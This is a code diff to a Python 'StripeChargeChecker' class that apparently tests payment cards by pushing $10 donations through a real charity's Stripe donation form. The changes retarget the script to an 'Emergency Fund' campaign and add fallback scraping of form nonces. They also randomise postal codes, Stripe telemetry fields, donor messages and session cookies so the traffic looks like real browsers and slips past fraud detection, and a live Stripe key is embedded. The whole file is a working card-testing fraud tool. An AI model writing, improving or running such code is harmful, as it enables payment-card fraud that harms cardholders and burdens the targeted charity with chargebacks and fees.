@@ -314,10 +314,10 @@ class StripeChargeChecker:
         self.base_url = "https://www.beitsahourusa.org"
         self.stripe_key = "pk_live_51HhefWFVQkom3lAfFiSCo1daFNqT2CegRXN4QedqlScZqZRP55JVTekqb4d68wMYUY4bfg8M9eJK8A3pou9EKdhW00QAVLLIdm"
 
-        # Updated campaign details for Michigan Chapter
-        self.campaign_id = "292"
-        self.campaign_description = "Establishing Michigan Chapter"
-        self.campaign_path = "/campaigns/establishing-michigan-chapter/"
+        # UPDATED: Campaign details for Emergency Fund (allows $10 donation)
+        self.campaign_id = "1247"
+        self.campaign_description = "Emergency Fund"
+        self.campaign_path = "/campaigns/emergency-fund/"
 
         self.bin_services = [
             {
@@ -660,9 +660,9 @@ class StripeChargeChecker:
 <b>Checking card... Please wait.</b>"""
 
     async def get_form_tokens(self, client):
-        """Get form tokens from Michigan Chapter donation page"""
+        """Get form tokens from Emergency Fund donation page"""
         try:
-            logger.step(1, 4, "Loading Michigan Chapter donation page...")
+            logger.step(1, 4, "Loading Emergency Fund donation page...")
 
             response = await client.get(
                 f"{self.base_url}{self.campaign_path}",
@@ -676,28 +676,55 @@ class StripeChargeChecker:
 
             tokens = {}
 
-            # Extract form ID
-            form_id_match = re.search(r'name="charitable_form_id" value="([^"]+)"', html_text)
+            # Extract form ID - pattern from HAR: charitable_form_id="69edad3f8ca91"
+            form_id_match = re.search(r'name="charitable_form_id"\s+value="([^"]+)"', html_text)
+            if not form_id_match:
+                form_id_match = re.search(r'name="charitable_form_id" value="([^"]+)"', html_text)
+            if not form_id_match:
+                form_id_match = re.search(r'charitable_form_id["\']?\s*:\s*["\']([^"\']+)["\']', html_text)
+            if not form_id_match:
+                form_id_match = re.search(r'id="charitable_form_id"[^>]+value="([^"]+)"', html_text)
+            
             if form_id_match:
                 tokens['charitable_form_id'] = form_id_match.group(1)
                 logger.success(f"Form ID: {tokens['charitable_form_id']}")
             else:
-                return None, "No form ID found"
+                logger.warning("Form ID not found, trying alternative extraction...")
+                # Try to find any hidden input with name containing "charitable_form_id"
+                form_id_match = re.search(r'<input[^>]*name="charitable_form_id"[^>]*value="([^"]+)"', html_text)
+                if form_id_match:
+                    tokens['charitable_form_id'] = form_id_match.group(1)
+                    logger.success(f"Form ID (alt): {tokens['charitable_form_id']}")
+                else:
+                    return None, "No form ID found"
 
-            # Extract donation nonce
-            nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html_text)
+            # Extract donation nonce - pattern from HAR: _charitable_donation_nonce="ad3d999988"
+            nonce_match = re.search(r'name="_charitable_donation_nonce"\s+value="([^"]+)"', html_text)
+            if not nonce_match:
+                nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html_text)
+            if not nonce_match:
+                nonce_match = re.search(r'_charitable_donation_nonce["\']?\s*:\s*["\']([^"\']+)["\']', html_text)
+            
             if nonce_match:
                 tokens['donation_nonce'] = nonce_match.group(1)
                 logger.success(f"Donation nonce: {tokens['donation_nonce']}")
             else:
-                return None, "No donation nonce found"
+                # Try alternative pattern
+                nonce_match = re.search(r'<input[^>]*name="_charitable_donation_nonce"[^>]*value="([^"]+)"', html_text)
+                if nonce_match:
+                    tokens['donation_nonce'] = nonce_match.group(1)
+                    logger.success(f"Donation nonce (alt): {tokens['donation_nonce']}")
+                else:
+                    return None, "No donation nonce found"
 
-            # Use the updated campaign ID for Michigan Chapter
+            # Use the updated campaign ID for Emergency Fund
             tokens['campaign_id'] = self.campaign_id
-            logger.success(f"Campaign ID: {tokens['campaign_id']} (Michigan Chapter)")
+            logger.success(f"Campaign ID: {tokens['campaign_id']} (Emergency Fund)")
 
             # Extract other required fields
             wp_referer_match = re.search(r'name="_wp_http_referer" value="([^"]+)"', html_text)
+            if not wp_referer_match:
+                wp_referer_match = re.search(r'name="_wp_http_referer"\s+value="([^"]+)"', html_text)
             tokens['_wp_http_referer'] = wp_referer_match.group(1) if wp_referer_match else self.campaign_path
 
             return tokens, None
@@ -707,7 +734,7 @@ class StripeChargeChecker:
             return None, f"Token error: {str(e)}"
 
     async def create_stripe_payment_method(self, client, card_details, user_info):
-        """Create Stripe payment method"""
+        """Create Stripe payment method - UPDATED with full payload from HAR"""
         try:
             cc, mes, ano, cvv = card_details
 
@@ -719,25 +746,37 @@ class StripeChargeChecker:
             muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
             sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
 
+            # Generate random wallet config ID
+            wallet_config_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '-' + \
+                              ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + \
+                              ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + \
+                              ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + \
+                              ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+
+            # Full payment data matching HAR file structure
             payment_data = {
                 'type': 'card',
                 'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
                 'billing_details[email]': user_info['email'],
-                'billing_details[address][postal_code]': '10080',
+                'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
                 'card[number]': cc,
                 'card[cvc]': cvv,
                 'card[exp_month]': mes,
                 'card[exp_year]': ano[-2:],
-                'allow_redisplay': 'unspecified',
-                'pasted_fields': 'number',
-                'payment_user_agent': f'stripe.js/{random.choice(["eeaff566a9", "065b474d33"])}; stripe-js-v3/{random.choice(["eeaff566a9", "065b474d33"])}; card-element',
-                'referrer': self.base_url,
-                'time_on_page': str(random.randint(30000, 90000)),
-                'client_attribution_metadata[client_session_id]': client_session_id,
                 'guid': guid,
                 'muid': muid,
                 'sid': sid,
+                'pasted_fields': 'number',
+                'payment_user_agent': f'stripe.js/{random.choice(["332636417d", "eeaff566a9", "065b474d33"])}; stripe-js-v3/{random.choice(["332636417d", "eeaff566a9", "065b474d33"])}; card-element',
+                'referrer': self.base_url,
+                'time_on_page': str(random.randint(30000, 90000)),
+                'client_attribution_metadata[client_session_id]': client_session_id,
+                'client_attribution_metadata[merchant_integration_source]': 'elements',
+                'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
+                'client_attribution_metadata[merchant_integration_version]': '2017',
+                'client_attribution_metadata[wallet_config_id]': wallet_config_id,
                 'key': self.stripe_key,
+                'allow_redisplay': 'unspecified',
                 '_stripe_version': '2024-06-20'
             }
 
@@ -781,16 +820,16 @@ class StripeChargeChecker:
                     logger.error(f"Stripe error: {error_msg}")
                     return {'success': False, 'error': error_msg}
                 except:
-                    return {'success': False, 'error': 'Stripe API error'}
+                    return {'success': False, 'error': f'Stripe API error: {response.status_code}'}
 
         except Exception as e:
             logger.error(f"Payment method error: {str(e)}")
             return {'success': False, 'error': f"Payment method error: {str(e)}"}
 
     async def submit_donation(self, client, tokens, payment_method_id, user_info):
-        """Submit donation to Michigan Chapter and get real response"""
+        """Submit donation to Emergency Fund and get real response"""
         try:
-            logger.step(3, 4, "Submitting donation to Michigan Chapter...")
+            logger.step(3, 4, "Submitting donation to Emergency Fund...")
 
             donation_data = {
                 'charitable_form_id': tokens['charitable_form_id'],
@@ -800,14 +839,12 @@ class StripeChargeChecker:
                 'campaign_id': tokens['campaign_id'],
                 'description': self.campaign_description,
                 'ID': '0',
+                'gateway': 'stripe',
                 'custom_donation_amount': '10.00',
-                'recurring_donation': 'once',
                 'first_name': user_info['first_name'],
                 'last_name': user_info['last_name'],
                 'email': user_info['email'],
-                'additiona_message': 'Support our cause and help those in need',
-                'anonymous_donation': '1',
-                'gateway': 'stripe',
+                'additiona_message': random.choice(['Supporting the cause', 'Emergency relief', 'Helping families in need', 'Donation for emergency fund', 'Stay strong']),
                 'stripe_payment_method': payment_method_id,
                 'cover_fees': '1',
                 'action': 'make_donation',
@@ -821,7 +858,7 @@ class StripeChargeChecker:
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": self.base_url,
                 "Referer": f"{self.base_url}{self.campaign_path}",
-                "Cookie": f"__stripe_mid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}; charitable_session={''.join(random.choices('0123456789abcdef', k=32))}; __stripe_sid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}"
+                "Cookie": f"charitable_session={''.join(random.choices('0123456789abcdef', k=32))}||86400||82800; __stripe_mid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}; __stripe_sid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}"
             }
 
             logger.network(f"Using payment method: {payment_method_id}")
